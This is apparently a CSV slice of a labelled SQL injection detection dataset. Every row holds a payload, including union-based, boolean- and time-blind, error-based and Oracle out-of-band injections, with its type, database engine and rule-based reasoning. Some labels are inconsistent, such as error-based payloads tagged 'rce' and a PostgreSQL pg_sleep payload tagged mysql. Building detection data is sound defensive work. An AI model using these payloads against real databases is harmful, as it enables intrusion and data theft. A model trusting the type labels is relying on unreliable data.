row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
8250,"-3035"" ) union all select 7912,7912,7912#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8251,"-3321"" where 1603 = 1603 union all select 1603,1603,1603,1603#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8252,"1' ) ) as xuab where 4369 = 4369 union all select null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8253,"1"" ) where 8878 = 8878 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
8254,"1%"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""%"" = """,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
8255,"1' ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( 'subq' like 'subq",1,,rce,generic,0.95,0x76555642 detected — rce injection (priority 1) on generic,rule-based
8256,1 ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 9288 = 9288,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
8257,"-8073 ) ) ) union all select 4481,4481,4481,4481--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8258,"1"" ) ) as tkmd where 3415 = 3415 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8259,"-4319"" ) where 7534 = 7534 or 8246 = 3217",1,,boolean_blind,generic,0.95,7534 = 7534 or detected — boolean_blind injection (priority 8) on generic,rule-based
8260,"-6431"" ) ) union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8261,1' ) ) as pdrg where 5960 = 5960 and 9198 = 9198--,1,,boolean_blind,generic,0.95,5960 = 5960 and detected — boolean_blind injection (priority 8) on generic,rule-based
8262,waitfor delay '0:0:5' and 'gsvt' = 'gsvt,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
